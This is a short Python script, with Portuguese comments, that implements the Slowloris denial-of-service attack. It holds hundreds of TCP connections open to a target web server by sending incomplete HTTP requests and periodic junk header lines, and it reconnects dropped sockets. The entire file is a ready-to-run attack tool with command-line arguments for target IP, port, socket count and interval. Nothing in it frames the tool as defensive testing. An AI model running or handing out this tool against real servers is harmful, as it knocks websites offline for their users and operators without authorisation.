# Author: Luiz G F Michelmann
# Date: 2026-08-25
# Testado na versão 3.14 do python

import socket
import time
import sys

def slowloris(target, port, sockets_count, sleeptime):
    sockets = []
    
    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
            sys.stdout.write(f"\r[+] Conectando... {i+1}/{sockets_count}")
            sys.stdout.flush()
        except:
            pass
    
    print(f"\n[*] {len(sockets)} sockets ativos. Mantendo...")
    
    while len(sockets) > 0:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
        
        reconecta_se_necessario(sockets, target, port, sockets_count)
        print(f"[*] Sockets ativos: {len(sockets)}/{sockets_count}")
        time.sleep(sleeptime)

def reconecta_se_necessario(sockets, target, port, sockets_count):
    while len(sockets) < sockets_count:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
        except:
            break

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 slowloris.py <IP> [porta] [sockets] [sleeptime]")
        print("Exemplo: python3 slowloris.py 192.168.1.100 80 500 10")
        sys.exit(1)
    
    TARGET = sys.argv[1]
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    SOCKETS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    SLEEPTIME = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    
    slowloris(TARGET, PORT, SOCKETS, SLEEPTIME)
